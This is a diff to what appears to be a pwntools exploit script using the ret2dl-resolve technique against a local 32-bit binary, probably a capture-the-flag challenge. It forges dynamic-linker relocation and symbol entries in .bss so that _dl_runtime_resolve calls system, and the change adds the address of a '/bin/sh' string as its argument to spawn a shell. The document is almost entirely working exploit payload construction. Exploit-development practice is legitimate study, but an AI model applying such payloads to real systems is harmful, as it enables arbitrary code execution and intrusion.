@@ -25,6 +25,7 @@ base_addr = bss_addr+0x20
 reloc_arg = base_addr-rel_plt_addr
 dynsym_off = ((base_addr+0x8-dynsym_addr)/0x10) << 0x8| 0x7
 system_off = base_addr+0x18-dynstr_addr
+bin_sh_addr = base_addr+0x20
 
 p = process(elf)
 
@@ -40,7 +41,8 @@ payload += p32(0x28)
 payload += p32(plt_addr)    # jump to _dl_runtime_resolve
 payload += p32(reloc_arg)   # reloc_arg
 payload += p32(read_plt)
-payload += p32(0)+p32(0x804a080)
+payload += p32(0)
+payload += p32(bin_sh_addr)
 payload += p8(0)*(0x100-len(payload))
 p.send(payload)
 
